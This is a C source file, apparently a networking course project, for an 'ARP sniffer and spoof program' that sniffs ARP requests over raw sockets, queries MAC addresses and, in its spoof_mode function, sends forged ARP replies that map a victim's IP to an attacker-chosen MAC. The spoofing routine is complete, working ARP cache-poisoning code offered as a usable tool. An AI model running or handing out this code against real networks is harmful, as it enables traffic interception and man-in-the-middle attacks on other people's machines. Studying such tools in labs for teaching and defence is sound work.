#include "arp.h"
unsigned char broad_cast[ETH_ALEN] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
unsigned char zero[ETH_ALEN] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
void print_arp_packet(struct arp_packet rcvbuff)
{
	printf("\n-----------------arp package begin--------------------------\n");
	int i;
	printf(" mac_target = ");
	for (i = 0; i < ETH_ALEN; i++)
		printf(i > 0 ? ":%.2x" : "%.2x", rcvbuff.mac_target[i]);
	printf("\n mac_source = ");
	for (i = 0; i < ETH_ALEN; i++)
		printf(i > 0 ? ":%.2x" : "%.2x", rcvbuff.mac_source[i]);
	printf("\n ethertype = 0x%x", ntohs(rcvbuff.ethertype));
	printf("\n hw_type = 0x%x", ntohs(rcvbuff.hw_type));
	printf("\n proto_type = 0x%x", ntohs(rcvbuff.proto_type));
	printf("\n mac_addr_len = 0x%x", rcvbuff.mac_addr_len);
	printf("\n ip_addr_len = 0x%x", rcvbuff.ip_addr_len);
	printf("\n operation_code = 0x%x", ntohs(rcvbuff.operation_code));
	printf("\n mac_sender = ");
	for (i = 0; i < ETH_ALEN; i++)
		printf(i > 0 ? ":%.2x" : "%.2x", rcvbuff.mac_sender[i]);

	//inet_ntop(AF_INET,*(struct in_addr*)(rcvbuff.ip_sender),str,INET_ADDRSTRLEN);
	printf("\n ip_sender = ");
	printf("%s ", inet_ntoa(*(struct in_addr *)(rcvbuff.ip_sender)));
	printf("\n mac_receiver = ");
	for (i = 0; i < ETH_ALEN; i++)
		printf(i > 0 ? ":%.2x" : "%.2x", rcvbuff.mac_receiver[i]);
	printf("\n ip_receiver = %s", inet_ntoa(*(struct in_addr *)(rcvbuff.ip_receiver)));

	printf("\n-----------------arp package end----------------------------\n");
}

void print_usage()
{
	printf("[ ARP sniffer and spoof program ]\n");
	printf("Format :\n");
	printf("1) ./arp -l -a\n");
	printf("2) ./arp -l <filter_ip_address>\n");
	printf("3) ./arp -q <query_ip_address>\n");
	printf("4) ./arp <fake_mac_address> <target_ip_address>\n");
}

void print_arp_by_sender_reciever(struct arp_packet rcvbuff)
{
	printf("Get ARP packet - Who has ");
	printf("%s	?	Tell ", inet_ntoa(*(struct in_addr *)(rcvbuff.ip_receiver)));
	printf("%s \n", inet_ntoa(*(struct in_addr *)(rcvbuff.ip_sender)));
}

void print_arp_using_filter(struct arp_packet rcvbuff, const char *ip)
{
	if (strcmp(ip, inet_ntoa(*(struct in_addr *)(rcvbuff.ip_receiver))) == 0 || strcmp(ip, inet_ntoa(*(struct in_addr *)(rcvbuff.ip_sender))) == 0)
	{
		printf("Get ARP packet - Who has ");
		printf("%s	?	Tell ", inet_ntoa(*(struct in_addr *)(rcvbuff.ip_receiver)));
		printf("%s \n", inet_ntoa(*(struct in_addr *)(rcvbuff.ip_sender)));
	}
}

bool is_ip(const char *ip)
{
	int dots = 0;	/*字符:的个数*/
	int setions = 0; /*ip每一部分总和（0-255）*/

	if (NULL == ip || *ip == '.')
	{ /*排除输入参数为NULL*/
		return false;
	}

	while (*ip)
	{
		if (*ip == '.')
		{
			dots++;
			if (setions >= 0 && setions <= 255)
			{ /*检查ip是否合法*/
				setions = 0;
				ip++;
				continue;
			}
			return false;
		}
		else if (*ip >= '0' && *ip <= '9')
		{										  /*判断是不是数字*/
			setions = setions * 10 + (*ip - '0'); /*求每一段总和*/
		}
		else
			return false;
		ip++;
	}
	/*判断IP最后一段是否合法*/
	if (setions >= 0 && setions <= 255)
	{
		if (dots == 3)
		{
			return true;
		}
	}

	return false;
}

bool is_mac(const char *mac)
{

	//correct mac form = XX:XX:XX:XX:XX:XX
	int dots = 0;	/*字符.的個數*/
	int setions = 0; /*mac每一部分總和（0-255）*/

	if (NULL == mac)
	{ /*排除输入参數為NULL*/
		return false;
	}

	while (*mac)
	{
		if (*mac == ':')
		{
			dots++;
			if (setions >= 0 && setions <= 255)
			{ /*检查ip是否合法*/
				setions = 0;
				mac++;
				continue;
			}
			return false;
		}
		else if (*mac >= '0' && *mac <= '9')
		{										   /*判断是不是数字*/
			setions = setions * 16 + (*mac - '0'); /*求每一段總和*/
		}
		else if (*mac >= 'A' && *mac <= 'F')
		{
			setions = setions * 16 + (*mac - 'A' + 10);
		}
		else if (*mac >= 'a' && *mac <= 'f')
		{
			setions = setions * 16 + (*mac - 'a' + 10);
		}
		else
			return false;
		mac++;
	}
	/*判断mac最後一段是否合法*/
	if (setions >= 0 && setions <= 255)
	{

		if (dots == 5)
		{
			return true;
		}
	}

	return false;
}

void arp_l_a(int mode, const char *temp)
{
	printf("[ ARP sniffer and spoof program ]\n");
	printf("### ARP sniffer mode ###\n");
	int sockfd_recv = 0;

	// Open a recv socket in data-link layer.
	if ((sockfd_recv = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
	{
		perror("open recv socket error:");
		exit(1);
	}

	while (1)
	{
		struct arp_packet rcvbuff;
		if (-1 == recv(sockfd_recv, &rcvbuff, sizeof(rcvbuff), 0))
		{
			perror("recv error");
			continue;
		}
		if (ntohs(rcvbuff.operation_code) == 0x1 && ntohs(rcvbuff.ethertype) == 0x0806 && mode == 0)
			print_arp_by_sender_reciever(rcvbuff);

		if (ntohs(rcvbuff.operation_code) == 0x1 && ntohs(rcvbuff.ethertype) == 0x0806 && mode == 1)
			print_arp_using_filter(rcvbuff, temp);
	}
}

void query_mode(char *aim, char *my_ether_name)
{
	printf("[ ARP sniffer and spoof program ]\n");
	printf("### ARP Query mode ###\n");
	int sockfd_send;
	// Open a send socket in data-link layer.
	if ((sockfd_send = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
	{
		perror("open send socket error");
		exit(sockfd_send);
	}

	struct arp_packet arp;
	struct sockaddr_ll my_etheraddr;
	struct ifreq ifr;
	
	int sock,res  ,i;

	sock = socket(AF_INET, SOCK_STREAM, 0);
	strcpy(ifr.ifr_name, my_ether_name);
	res = ioctl(sock, SIOCGIFADDR, &ifr);

	char *my_ip = inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);

	res = ioctl(sock, SIOCGIFHWADDR, &ifr);

	unsigned char My_mac[6];

	memcpy(My_mac, ifr.ifr_hwaddr.sa_data, ETH_ALEN); //ifr to unsigned char

	fill_arp_packet(&arp, 1, broad_cast, My_mac, aim, my_ip);

	memset(&my_etheraddr, 0, sizeof(my_etheraddr));

	if (ioctl(sockfd_send, SIOCGIFINDEX, &ifr) == -1)
		perror("error : ioctl() get ifindex");

	memset(&my_etheraddr, 0, sizeof(my_etheraddr));
	my_etheraddr.sll_ifindex = ifr.ifr_ifindex;
	my_etheraddr.sll_family = AF_PACKET;
	my_etheraddr.sll_protocol = htons(ETH_P_ARP);
	//print_arp_packet(arp);
	int sockfd_recv = 0;
	// Open a recv socket in data-link layer.
	if ((sockfd_recv = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0)
	{
		perror("open recv socket error:");
		exit(1);
	}

	while (1)
	{
		res = sendto(sockfd_send, &arp, sizeof(arp), 0, (struct sockaddr *)&my_etheraddr, sizeof(my_etheraddr));
		if (-1 == res)
		{
			perror("send error");
		}
		else
		{
			//printf("sendto over \n");
		}
		sleep(2);

		struct arp_packet rcvbuff;
		if (-1 == recv(sockfd_recv, &rcvbuff, sizeof(rcvbuff), 0))
		{
			perror("recv error");
			continue;
		}
		//只顯示從目的地回傳的ARP reply
		if (strcmp(aim, inet_ntoa(*(struct in_addr *)(rcvbuff.ip_sender))) == 0)
		{
			printf("MAC address of %s is ", aim);
			for (i = 0; i < ETH_ALEN; i++)
				printf(i > 0 ? ":%.2x" : "%.2x", rcvbuff.mac_sender[i]);
			printf("\n");
			break;
		}
	}
}

void spoof_mode(char *F_mac, char *T_ip, char *my_ether_name)
{
	int sockfd_recv = 0;
	unsigned char T_mac[6];
	char *S_ip;
	// Open a recv socket in data-link layer.
	if ((sockfd_recv = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
	{
		perror("open recv socket error:");
		exit(1);
	}
	//listen arp packet of target
	while (1)
	{
		struct arp_packet rcvbuff;
		if (-1 == recv(sockfd_recv, &rcvbuff, sizeof(rcvbuff), 0))
		{
			perror("recv error");
			continue;
		}
		if (strcmp(T_ip, inet_ntoa(*(struct in_addr *)(rcvbuff.ip_receiver))) == 0)
		{
			printf("Get ARP packet - Who has ");
			printf("%s	?	Tell ", inet_ntoa(*(struct in_addr *)(rcvbuff.ip_receiver)));
			printf("%s \n", inet_ntoa(*(struct in_addr *)(rcvbuff.ip_sender)));
			//儲存目標mac,ip
			int i;
			for (i = 0; i < 6; ++i)
			{
				T_mac[i] = rcvbuff.mac_sender[i];
			}
			S_ip = inet_ntoa(*(struct in_addr *)(rcvbuff.ip_sender));

			break;
		}
	}

	//spoof
	int sockfd_send;
	// Open a send socket in data-link layer.
	if ((sockfd_send = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
	{
		perror("open send socket error");
		exit(sockfd_send);
	}

	struct arp_packet arp;
	struct sockaddr_ll my_etheraddr;
	struct ifreq ifr;

	int res;

	//mac string to unsign char array
	unsigned char F_u_mac[6];
	mac_string_to_uchar_array(F_mac, F_u_mac); //mac string to unsigned char array
	fill_arp_packet(&arp, 2, T_mac, F_u_mac, S_ip, T_ip);

	strcpy(ifr.ifr_name, my_ether_name);
	if (ioctl(sockfd_send, SIOCGIFINDEX, &ifr) == -1)
		perror("error : ioctl() get ifindex");

	memset(&my_etheraddr, 0, sizeof(my_etheraddr));
	my_etheraddr.sll_ifindex = ifr.ifr_ifindex;
	my_etheraddr.sll_family = AF_PACKET;
	my_etheraddr.sll_protocol = htons(ETH_P_ARP);
	//print_arp_packet(arp);

	int count = 0;
	while (count < 2)
	{
		res = sendto(sockfd_send, &arp, sizeof(arp), 0, (struct sockaddr *)&my_etheraddr, sizeof(my_etheraddr));
		if (-1 == res)
		{
			perror("send error");
		}
		else
			printf("sendto success \n");
		sleep(1);
		++count;
	}
}

void mac_string_to_uchar_array(char *s_max, unsigned char *u_max)
{

	int dots = 0;			   /*字符数*/
	unsigned char setions = 0; /*mac每一部分總和（0-255）*/

	while (*s_max)
	{
		if (*s_max == ':')
		{
			if (setions >= 0 && setions <= 255)
			{
				u_max[dots] = setions;
				setions = 0;
				s_max++;
				dots++;
				continue;
			}
		}
		else if (*s_max >= '0' && *s_max <= '9')
		{											 /*判断是不是数字*/
			setions = setions * 16 + (*s_max - '0'); /*求每一段總和*/
		}
		else if (*s_max >= 'A' && *s_max <= 'F')
		{
			setions = setions * 16 + (*s_max - 'A' + 10);
		}
		else if (*s_max >= 'a' && *s_max <= 'f')
		{
			setions = setions * 16 + (*s_max - 'a' + 10);
		}
		s_max++;
	}
	/*最後一段*/
	u_max[dots] = setions;
}

bool fill_arp_packet(struct arp_packet *arp, int opcode, unsigned char *d_mac, unsigned char *s_mac, char *d_ip, char *s_ip)
{

	if (!arp)
		return false;

	arp->ethertype = htons(ETH_P_ARP);
	arp->hw_type = htons(0x1);
	arp->proto_type = htons(ETH_P_IP);
	arp->mac_addr_len = ETH_ALEN;
	arp->ip_addr_len = 4;
	arp->operation_code = htons(opcode);
	memset(arp->padding, 0, sizeof(arp->padding));

	struct in_addr ip_sender, ip_target;
	memcpy(arp->mac_source, s_mac, 6 * sizeof(unsigned char));
	memcpy(arp->mac_target, d_mac, 6 * sizeof(unsigned char));

	memcpy(arp->mac_sender, s_mac, 6 * sizeof(unsigned char));
	inet_aton(s_ip, &ip_sender);
	memcpy(arp->ip_sender, &ip_sender, sizeof(ip_sender));
	if (opcode == 1)//request , mac_receiver set zero
		memcpy(arp->mac_receiver, zero, 6 * sizeof(unsigned char));
	else if (opcode == 2)
		memcpy(arp->mac_receiver, d_mac, 6 * sizeof(unsigned char));
	inet_aton(d_ip, &ip_target);
	memcpy(arp->ip_receiver, &ip_target, sizeof(ip_target));
	return true;
}
